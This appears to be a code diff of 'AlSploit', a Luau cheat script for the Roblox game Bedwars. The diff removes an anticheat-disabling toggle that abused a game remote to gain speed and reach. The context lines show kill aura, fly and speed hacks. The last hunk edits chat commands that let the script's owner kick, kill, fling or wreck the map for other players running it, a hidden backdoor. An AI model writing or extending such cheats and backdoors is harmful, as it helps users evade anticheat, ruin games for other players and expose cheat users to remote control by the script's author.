@@ -827,7 +827,6 @@ local Client = require(ReplicatedStorage.TS.remotes).default.Client
 local Camera = WorkSpace.CurrentCamera
 local OrigC0 = ReplicatedStorage.Assets.Viewmodel.RightHand.RightWrist.C0
 
-local BlossomWindTunnelCreateBodyForceRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BlossomWindTunnelCreateBodyForce")
 local HannahPromptTriggerRemote = Client:Get("HannahPromptTrigger")
 local TrinitySetAngelTypeRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SetAngelType")
 local SetObservedChestRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/SetObservedChest")
@@ -881,7 +880,6 @@ local InventoryUtil = require(ReplicatedStorage.TS.inventory["inventory-util"]).
 local ItemTable = debug.getupvalue(require(ReplicatedStorage.TS.item["item-meta"]).getItemMeta, 1)
 
 local KillAuraAnimationCooldown = true
-local AnticheatDisabled = false
 local InfiniteFlyValue = false
 local FlyBodyVelocity = nil
 local SpoofedCamera = nil
@@ -1555,10 +1553,6 @@ function GetSpeed()
 			Speed = Speed + 18
 		end
 
-		if AnticheatDisabled == true then
-			Speed = Speed + 5
-		end
-
 		Speed = ((Speed + Settings.Speed.Speed) - 20)
 	end
 
@@ -1896,7 +1890,7 @@ local function SwordHit(Entity, Weapon, NearestEntityDistance)
 	end)
 
 	task.spawn(function()
-		if Settings.KillAura.Strafe == true and NearestEntityDistance < (AnticheatDisabled and 14 or 12) then
+		if Settings.KillAura.Strafe == true and NearestEntityDistance < 12 then
 			LocalPlayerHumanoidRootPart.CFrame = CFrame.new(EntityPrimaryPart.Position - EntityPrimaryPart.CFrame.LookVector * 5 + Vector3.new(0, 0, 5))
 		end
 	end)
@@ -2427,14 +2421,6 @@ task.spawn(function()
 					Nuker(NearestBed, NearestOre)
 				end			
 			end
-		end)
-
-		task.spawn(function()
-			if IsAlive(LocalPlayer) and Settings.AcDisabler.Value == true then
-				BlossomWindTunnelCreateBodyForceRemote:FireServer()
-
-				AnticheatDisabled = true
-			end			
 		end)
 	until not game
 end)
@@ -3101,49 +3087,6 @@ task.spawn(function()
 					end
 
 					if Settings.InfiniteJump.Value == false then
-						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
-					end
-				end
-			end
-		end)
-	end)
-end)
-
-task.spawn(function()
-	local AcDisabler, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "AcDisabler", Settings.AcDisabler.Value, function(CallBack)
-		Settings.AcDisabler.Value = CallBack
-	end)
-
-	task.spawn(function()
-		local InstanceUI
-		local Value = false
-
-		DropDownButton.Activated:Connect(function()
-			Value = not Value
-
-			if Value == true then
-				InstanceUI = CreateKeyBind(BlatantTab, Settings.AcDisabler.KeyBind, LayoutOrder + 1, function(CallBack)
-					Settings.AcDisabler.KeyBind = CallBack
-				end)
-			end
-
-			if Value == false then
-				InstanceUI:Destroy()
-			end
-		end)
-	end)
-
-	task.spawn(function()
-		UserInputService.InputBegan:Connect(function(Input)
-			if not UserInputService:GetFocusedTextBox() then
-				if Input.KeyCode.Name == Settings.AcDisabler.KeyBind then
-					Settings.AcDisabler.Value = not Settings.AcDisabler.Value
-
-					if Settings.AcDisabler.Value == true then
-						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
-					end
-
-					if Settings.AcDisabler.Value == false then
 						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
 					end
 				end
@@ -4803,7 +4746,7 @@ task.spawn(function()
 
 		if Settings.Sigma.Value == true then
 			task.spawn(function()
-				if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape").Decal then
+				if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal") then
 					LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal").Texture = "rbxassetid://" .. 13528140280
 				end
 			end)
@@ -4811,7 +4754,7 @@ task.spawn(function()
 
 		if Settings.Sigma.Value == false then
 			task.spawn(function()
-				if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape").Decal then
+				if IsAlive(LocalPlayer) and Settings.Cape.Value == true and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal") then
 					LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal").Texture = "rbxassetid://" .. 16223063079
 				end
 			end)
@@ -5012,25 +4955,25 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == ";kick default" and v.Name == Owner and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
+				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer:Kick("Kicked by AlSploit owner")
 					end)
 				end
 
-				if Message:lower() == ";kill default" and v.Name == Owner and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
+				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						KillHumanoid(0)
 					end)
 				end
 
-				if Message:lower() == ";lagback default" and v.Name == Owner and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
+				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
 				end
 
-				if Message:lower() == ";breakmap default" and v.Name == Owner and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
+				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						for i, v in next, CollectionService:GetTagged("block") do
 							v:Destroy()
